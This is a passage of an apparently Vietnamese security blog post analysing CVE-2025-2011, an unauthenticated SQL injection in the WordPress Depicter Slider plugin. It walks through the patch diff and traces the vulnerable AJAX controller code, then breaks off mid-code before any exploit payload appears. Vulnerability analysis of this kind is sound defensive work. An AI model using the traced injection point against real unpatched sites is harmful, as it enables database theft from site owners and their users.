<!DOCTYPE html>
<html lang="vi">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>CVE-2025-2011 Analysis &amp; POC - w41bu1</title><meta name="Description" content="Security Vulnerability in WordPress Depicter Slider Plugin."><meta property="og:url" content="http://localhost:1313/vi/2025-09-30-cve-2025-2011/">
  <meta property="og:site_name" content="w41bu1">
  <meta property="og:title" content="CVE-2025-2011 Analysis &amp; POC">
  <meta property="og:description" content="Security Vulnerability in WordPress Depicter Slider Plugin.">
  <meta property="og:locale" content="vi">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-09-30T19:08:00+07:00">
    <meta property="article:modified_time" content="2025-09-30T19:08:00+07:00">
    <meta property="article:tag" content="Analyst">
    <meta property="article:tag" content="Plugin">
    <meta property="article:tag" content="Sqli">
    <meta property="og:image" content="http://localhost:1313/logo.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/logo.png">
  <meta name="twitter:title" content="CVE-2025-2011 Analysis &amp; POC">
  <meta name="twitter:description" content="Security Vulnerability in WordPress Depicter Slider Plugin.">
<meta name="application-name" content="LoveIt">
<meta name="apple-mobile-web-app-title" content="LoveIt">
<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/vi/2025-09-30-cve-2025-2011/" /><link rel="prev" href="http://localhost:1313/vi/2025-09-29-cve-2025-48118/" /><link rel="next" href="http://localhost:1313/vi/2025-10-01-cve-2022-21661/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "CVE-2025-2011 Analysis \u0026 POC",
        "inLanguage": "vi",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/vi\/2025-09-30-cve-2025-2011\/"
        },"image": ["http:\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "analyst, plugin, sqli","wordcount":  1423 ,
        "url": "http:\/\/localhost:1313\/vi\/2025-09-30-cve-2025-2011\/","datePublished": "2025-09-30T19:08:00+07:00","dateModified": "2025-09-30T19:08:00+07:00","license": "Tác phẩm này được cấp phép theo Giấy phép Creative Commons Ghi công - Phi thương mại 4.0 Quốc tế.","publisher": {
            "@type": "Organization",
            "name": "w41bu1","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/localhost:1313\/images\/avatar.jpeg",
                    "width":  736 ,
                    "height":  736 
                }},"author": {
                "@type": "Person",
                "name": "w41bu1"
            },"description": "Security Vulnerability in WordPress Depicter Slider Plugin."
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
          const query = window.matchMedia('(prefers-color-scheme: dark)');
          function applyTheme() {
            let theme = window.localStorage?.getItem('theme') || 'auto';
            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
            document.body.setAttribute('theme', isDark? 'dark' : 'light');
            document.body.setAttribute('cfg-theme', theme);
          }

          applyTheme();
          query.addEventListener('change', applyTheme);
        </script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/vi/posts/"> Posts </a><a class="menu-item" href="/vi/tags/"> Tags </a><a class="menu-item" href="/vi/categories/"> Categories </a><a class="menu-item" href="/vi/categories/documentation/"> Docs </a><a class="menu-item" href="/vi/about/"> About </a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a><a href="javascript:void(0);" class="menu-item language" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>                      
                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2025-09-30-cve-2025-2011/">English</option><option value="/vi/2025-09-30-cve-2025-2011/" selected>Vietnamese</option></select>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/vi/" title="w41bu1"><span class="header-title-pre"><i class='fa-solid fa-bug fa-fw' aria-hidden='true'></i></span>w41bu1</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Tìm kiếm..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Tìm kiếm">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Xoá">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Huỷ
                    </a>
                </div><a class="menu-item" href="/vi/posts/" title="">Posts</a><a class="menu-item" href="/vi/tags/" title="">Tags</a><a class="menu-item" href="/vi/categories/" title="">Categories</a><a class="menu-item" href="/vi/categories/documentation/" title="">Docs</a><a class="menu-item" href="/vi/about/" title="">About</a><a class="menu-item" href="https://github.com/dillonzq/LoveIt" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Đổi chủ đề">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a><a href="javascript:void(0);" class="menu-item" title="Chọn Ngôn ngữ">
                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
                    <select class="language-select" onchange="location = this.value;"><option value="/2025-09-30-cve-2025-2011/">English</option><option value="/vi/2025-09-30-cve-2025-2011/" selected>Vietnamese</option></select>
                </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Nội dung</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CVE-2025-2011 Analysis & POC</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://w41bu1.github.io" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>w41bu1</a></span>&nbsp;<span class="post-category">trong <a href="/vi/categories/cve-analyst/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>CVE Analyst</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2025-09-30">2025-09-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1423 từ&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 phút&nbsp;</div>
        </div><div class="featured-image"><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/2025-09-30-cve-2025-2011/app.png"
        data-srcset="/2025-09-30-cve-2025-2011/app.png, /2025-09-30-cve-2025-2011/app.png 1.5x, /2025-09-30-cve-2025-2011/app.png 2x"
        data-sizes="auto"
        alt="/2025-09-30-cve-2025-2011/app.png"
        title="Security Vulnerability in WordPress Depicter Slider Plugin." width="1544" height="500" /></div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Nội dung</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#requirements">Requirements</a></li>
    <li><a href="#analysis">Analysis</a>
      <ul>
        <li><a href="#patch-diff">Patch Diff</a></li>
        <li><a href="#how-it-work">How it work?</a></li>
      </ul>
    </li>
    <li><a href="#exploit">Exploit</a>
      <ul>
        <li><a href="#detect-sqli">Detect SQLi</a></li>
        <li><a href="#get-first-letter-of-database-name">Get First Letter of Database Name</a></li>
      </ul>
    </li>
    <li><a href="#conclusion">Conclusion</a></li>
    <li><a href="#references">References</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><hr>
<p>Lỗ hổng xảy ra trên plugin <strong>Depicter Slider</strong> của WordPress trước phiên bản <strong>3.6.2</strong>. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.</p>
<ul>
<li><strong>CVE ID</strong>: <a href="https://www.cve.org/CVERecord?id=CVE-2025-2011" target="_blank" rel="noopener noreffer ">CVE-2025-2011</a></li>
<li><strong>Product</strong>: <a href="https://wordpress.org/plugins/depicter/" target="_blank" rel="noopener noreffer ">WordPress Depicter Slider Plugin</a></li>
<li><strong>Vulnerability Type</strong>: SQL Injection</li>
<li><strong>Affected Versions</strong>: &lt;= 3.6.1</li>
<li><strong>CVSS severity</strong>:  High (9.3)</li>
<li><strong>Required Privilege</strong>: Unauthenticated</li>
</ul>
<hr>
<h2 id="requirements">Requirements</h2>
<ul>
<li><a href="https://w41bu1.github.io/posts/wordpress-local-and-debugging/" target="_blank" rel="noopener noreffer "><strong>Local WordPress and Debugging</strong></a></li>
<li><strong>Depicter Slider</strong>:  v3.6.1(vul) và v3.6.2(fix)</li>
<li><strong>diff tool</strong>: <strong>meld</strong> hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version</li>
</ul>
<hr>
<h2 id="analysis">Analysis</h2>
<p>Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ <strong>GET</strong> request vào SQL query mà không có cơ chế kiểm soát chặt chẽ.</p>
<h3 id="patch-diff">Patch Diff</h3>
<p>Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá.
Có sự khác biệt rõ ở file <strong>app/src/Controllers/Ajax/LeadsAjaxController.php</strong></p>
<p><code>index</code>, <code>list</code>, <code>export</code> là 3 hàm đáng chú ý nằm trong class <code>LeadsAjaxController</code></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">index</span><span class="p">(</span><span class="nx">RequestInterface</span> <span class="nv">$request</span><span class="p">,</span> <span class="nv">$view</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$args</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;s&#39;</span>         <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span>   <span class="o">=</span> <span class="nx">\Depicter</span><span class="o">::</span><span class="na">lead</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$statusCode</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$response</span><span class="p">[</span><span class="s1">&#39;errors&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="mi">400</span> <span class="o">:</span> <span class="mi">200</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">\Depicter</span><span class="o">::</span><span class="na">json</span><span class="p">(</span><span class="nv">$response</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">withStatus</span><span class="p">(</span><span class="nv">$statusCode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">list</span><span class="p">(</span><span class="nx">RequestInterface</span> <span class="nv">$request</span><span class="p">,</span> <span class="nv">$view</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$args</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;s&#39;</span>                <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">\Depicter</span><span class="o">::</span><span class="na">leadRepository</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getResults</span><span class="p">(</span><span class="nv">$args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">\Depicter</span><span class="o">::</span><span class="na">json</span><span class="p">(</span><span class="nv">$response</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">export</span><span class="p">(</span><span class="nx">RequestInterface</span> <span class="nv">$request</span><span class="p">,</span> <span class="nv">$view</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$args</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;s&#39;</span>                <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="o">=</span> <span class="nx">\Depicter</span><span class="o">::</span><span class="na">leadRepository</span><span class="p">()</span><span class="o">-&gt;</span><span class="na">getResults</span><span class="p">(</span><span class="nv">$args</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// other logic
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">\Depicter</span><span class="o">::</span><span class="na">json</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;errors&#39;</span> <span class="o">=&gt;</span> <span class="p">[</span><span class="nx">__</span><span class="p">(</span><span class="s1">&#39;error occurred during the export process&#39;</span><span class="p">,</span> <span class="s1">&#39;depicter&#39;</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="p">])</span><span class="o">-&gt;</span><span class="na">withStatus</span><span class="p">(</span><span class="mi">400</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Cả 3 hàm đều được vá bằng cách sử dụng <code>Sanitize::sql</code> thay cho <code>Sanitize::textfield</code> nhằm đảm bảo param <code>'s'</code> được làm sạch và escape phù hợp cho ngữ cảnh câu lệnh SQL.</p>
<p><figure><a class="lightgallery" href="/2025-09-30-cve-2025-2011/patch_dif.png" title="patch diff" data-thumbnail="/2025-09-30-cve-2025-2011/patch_dif.png" data-sub-html="<h2>Ảnh minh họa sự khác biệt bản vá và bản lỗi</h2><p>patch diff</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-30-cve-2025-2011/patch_dif.png"
            data-srcset="/2025-09-30-cve-2025-2011/patch_dif.png, /2025-09-30-cve-2025-2011/patch_dif.png 1.5x, /2025-09-30-cve-2025-2011/patch_dif.png 2x"
            data-sizes="auto"
            alt="/2025-09-30-cve-2025-2011/patch_dif.png" width="683" height="201" />
    </a><figcaption class="image-caption">Ảnh minh họa sự khác biệt bản vá và bản lỗi</figcaption>
    </figure></p>
<h3 id="how-it-work">How it work?</h3>
<p>Để hiểu rõ hơn chức năng của <code>textfield</code> và <code>sql</code> ta tìm kiếm với từ khóa <code>function textfield</code>, có lẽ chúng được đặt trong cùng 1 file vì được gọi bằng cùng 1 class <code>Sanitize</code></p>
<blockquote>
<p>Nếu bạn đã cài <strong>PHP Intelephense Extension</strong> trong <strong>vscode</strong>, bạn có thể di chuyển đến hàm cụ thể bằng cách <kbd>Ctrl</kbd> <kbd>+</kbd> <kbd>Click</kbd> vào hàm cần đến.</p>
</blockquote>
<p><figure><a class="lightgallery" href="/2025-09-30-cve-2025-2011/search_1.png" title="search 1" data-thumbnail="/2025-09-30-cve-2025-2011/search_1.png" data-sub-html="<h2>Tìm kiếm hàm textfield trong class Sanitize</h2><p>search 1</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-30-cve-2025-2011/search_1.png"
            data-srcset="/2025-09-30-cve-2025-2011/search_1.png, /2025-09-30-cve-2025-2011/search_1.png 1.5x, /2025-09-30-cve-2025-2011/search_1.png 2x"
            data-sizes="auto"
            alt="/2025-09-30-cve-2025-2011/search_1.png" width="1243" height="248" />
    </a><figcaption class="image-caption">Tìm kiếm hàm textfield trong class Sanitize</figcaption>
    </figure></p>
<p><code>textfield</code> trả về dữ liệu đã được <strong>sanitize</strong> bằng <code>sanitize_text_field</code>, <code>sql</code> cũng là hàm trong cùng class, trả về dữ liệu đã được <strong>escape SQL</strong></p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">sql</span><span class="p">(</span> <span class="nv">$input</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">esc_sql</span><span class="p">(</span> <span class="nv">$input</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
<p>Vì đây là lỗ hổng <strong>unauthenticated</strong>, việc có 3 hàm như này, ta cần xác định xem điểm gọi đến chúng có cơ chế xác thực hay không. Chỉ sau khi chắc chắn rằng hàm nào thực sự được gọi trong bối cảnh không yêu cầu xác thực, ta mới tiếp tục phân tích phần logic bên trong để kiểm tra khả năng gây ra SQL Injection giúp giới hạn phạm vi truy vết.</p>
<p>Để xác định 3 hàm trên được gọi ở đâu, ta có thể tìm kiếm trực tiếp theo tên hàm. Tuy nhiên, các từ khóa như <code>index</code>, <code>list</code>, hay <code>export</code> lại quá phổ biến nên kết quả tìm kiếm sẽ rất nhiều và khó lọc. Vì vậy, thay vì tìm theo tên hàm, ta tìm với từ khóa là tên class <code>LeadsAjaxController</code>. Bởi lẽ khi được sử dụng, các hàm này đều phải được gọi thông qua class, nhờ đó phạm vi kết quả tìm kiếm sẽ được thu hẹp và dễ dàng hơn.</p>
<p><figure><a class="lightgallery" href="/2025-09-30-cve-2025-2011/search_2.png" title="search 2" data-thumbnail="/2025-09-30-cve-2025-2011/search_2.png" data-sub-html="<h2>Kết quả tìm kiếm LeadsAjaxController trong mã nguồn</h2><p>search 2</p>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="/2025-09-30-cve-2025-2011/search_2.png"
            data-srcset="/2025-09-30-cve-2025-2011/search_2.png, /2025-09-30-cve-2025-2011/search_2.png 1.5x, /2025-09-30-cve-2025-2011/search_2.png 2x"
            data-sizes="auto"
            alt="/2025-09-30-cve-2025-2011/search_2.png" width="1341" height="686" />
    </a><figcaption class="image-caption">Kết quả tìm kiếm LeadsAjaxController trong mã nguồn</figcaption>
    </figure></p>
<p>👉 <code>LeadsAjaxController</code> được sử dụng trong quá trình đăng ký <strong>route Ajax</strong>. Khi có request gửi tới endpoint <code>/wp-admin/admin-ajax.php?action=action_here&amp;param1=param1_here&amp;paramN=paramN_here</code>, hệ thống sẽ dựa trên khai báo <code>handle('LeadsAjaxController@function')</code> để gọi tới phương thức tương ứng trong class <code>LeadsAjaxController</code></p>
<p>Cả ba hàm ta đang <strong>focus</strong> đều được gọi bằng phương thức <strong>GET</strong>, nhưng <code>export</code> lại có <strong>middleware</strong> xử lý <code>csrf-api</code>, nên ta bỏ qua. Chỉ truy vết <code>index</code> và <code>list</code></p>
<p>Khi phân tích hai hàm này, ta thấy trong hàm <code>index</code>, biến <code>$response</code> được gán giá trị từ <code>\Depicter::lead()-&gt;get($args)</code>. Tuy nhiên, phương thức <code>get()</code> lại tiếp tục gọi đến <code>\Depicter::leadRepository()-&gt;getResults($args)</code>, tức là cùng một logic mà hàm <code>list</code> đã gọi trực tiếp. Do đó, ta chọn hàm <code>list</code> làm điểm truy vết chính.</p>
<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
    <div class="code-header language-php">
        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
        <span class="copy" title="Sao chép vào bộ nhớ tạm"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">list</span><span class="p">(</span><span class="nx">RequestInterface</span> <span class="nv">$request</span><span class="p">,</span> <span class="nv">$view</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$args</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;s&#39;</span>                <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;ids&#39;</span>              <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;ids&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;sources&#39;</span>          <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;sources&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;dateStart&#39;</span>        <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;dateStart&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;dateEnd&#39;</span>          <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;dateEnd&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;order&#39;</span>            <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;order&#39;</span><span class="p">,</span> <span class="s1">&#39;DESC&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;orderBy&#39;</span>          <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">textfield</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;orderBy&#39;</span><span class="p">,</span> <span class="s1">&#39;id&#39;</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;page&#39;</span>             <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">int</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;page&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;perPage&#39;</span>          <span class="o">=&gt;</span> <span class="nx">Sanitize</span><span class="o">::</span><span class="na">int</span><span class="p">(</span><span class="nv">$request</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="s1">&#39;perpage&#39;</span><span class="p">,</span> <span class="mi">10</span><span class="p">)),</span>
